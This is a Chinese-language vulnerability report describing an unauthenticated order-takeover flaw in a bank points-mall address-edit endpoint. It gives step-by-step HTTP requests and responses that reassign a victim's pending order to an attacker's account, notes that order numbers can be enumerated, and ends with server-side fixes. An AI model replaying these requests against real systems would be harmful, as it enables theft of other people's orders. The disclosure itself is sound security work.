# 积分商城存在订单接管漏洞

**漏洞名称：** 积分商城存在订单接管漏洞

**漏洞等级：** 高危

**漏洞类型：** 未授权访问 / 对象级越权写

**漏洞URL：**

`https://ttt.ebanktest.com.cn:18234/emallapp/address/orderEditAddress`

## 详细描述

订单收货地址修改接口既不校验调用者身份，也不校验 `orderNo` 是否属于调用者、`addressNo` 是否属于订单主体。

攻击者不需要登录，只要提交他人的待发货订单号和自己的地址簿主键，就能把订单的收货人、电话、地址全部替换，并把订单归属改到自己账号下。原订单主随后无法再查看该订单，也无法确认收货或申请售后。

## 复现步骤

前置条件：受害者账号 B 有一张下单不超过 1 小时、未修改过地址的待发货订单；攻击者账号 A 的地址簿中有一个可用地址。攻击请求本身不需要任何 Cookie。

### 第 1 步：确认受害者订单基线

受害者 B 使用自己的会话读取订单：

```http
POST /emallapp/myOrder/orderDetail HTTP/1.1
Host: ttt.ebanktest.com.cn:18234
Content-Type: application/x-www-form-urlencoded;charset=utf-8
Cookie: SESSION=<受害者B会话>
Content-Length: 53
Connection: close

orderNo=202610231301954700&bankcode=10124&channel=007
```

响应中的关键字段：

```json
{"retcode":"0000","orderinfo":{"orderNo":"202610231301954700","customersId":"55400618","consigneeName":"杨测试B","consigneePhone":"18766337856","orderStatus":"2"}}
```

### 第 2 步：零凭据提交订单改址

完整请求包，不带 Cookie、不带 Authorization：

```http
POST /emallapp/address/orderEditAddress HTTP/1.1
Host: ttt.ebanktest.com.cn:18234
Content-Type: application/x-www-form-urlencoded;charset=utf-8
Content-Length: 71
Connection: close

bankcode=10124&channel=007&orderNo=202610231301954700&addressNo=1315619
```

其中 `orderNo` 是受害者 B 的订单号，`addressNo=1315619` 是攻击者 A 自己的地址簿主键。

响应包：

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"msg":"交易成功","code":"0000"}
```

### 第 3 步：确认受害者失去订单

受害者 B 再次读取同一订单：

```http
POST /emallapp/myOrder/orderDetail HTTP/1.1
Host: ttt.ebanktest.com.cn:18234
Content-Type: application/x-www-form-urlencoded;charset=utf-8
Cookie: SESSION=<受害者B会话>
Content-Length: 53
Connection: close

orderNo=202610231301954700&bankcode=10124&channel=007
```

响应包：

```json
{"retshow":"根据订单号查询订单时出现错误！","retcode":"1001"}
```

B 的 `queryMyOrder` 列表中也不再出现该订单，同时 B 的 `checkToken` 仍返回 `0000`，排除会话失效导致读不到。

### 第 4 步：确认订单已过户到攻击者

攻击者 A 使用自己的会话读取同一订单：

```http
POST /emallapp/myOrder/orderDetail HTTP/1.1
Host: ttt.ebanktest.com.cn:18234
Content-Type: application/x-www-form-urlencoded;charset=utf-8
Cookie: SESSION=<攻击者A会话>
Content-Length: 53
Connection: close

orderNo=202610231301954700&bankcode=10124&channel=007
```

响应中的关键字段：

```json
{"retcode":"0000","orderinfo":{"orderNo":"202610231301954700","customersId":"55400614","consigneeName":"dsfds","consigneePhone":"15388888888","address":"北京市东城区222","orderStatus":"2"}}
```

订单主体已从 B 的 `55400618` 变成 A 的 `55400614`，收货信息也变成 A 的地址。

### 第 5 步：确认不是“固定成功”

对同一订单再次提交改址请求，会返回：

```json
{"code":"0003","msg":"只允许修改一次地址"}
```

说明第 2 步的 `0000` 是真实写分支执行后的结果，而不是接口无条件返回成功。

## 影响范围

未认证攻击者可以在下单后 1 小时内修改他人的待发货订单收货信息，并把订单过户到自己账号。可导致商品被改投、原主失去订单和售后权限；订单号带日期前缀和递增结构，具备批量枚举条件。

## 修复方案

1. `orderEditAddress` 必须要求有效登录会话，不能匿名调用。
2. 服务端校验 `orderNo` 属于当前会话主体，且 `addressNo` 属于该订单主体。
3. 修改订单归属、收货人等敏感字段时记录审计日志，并对同一订单的修改增加幂等和频率限制。
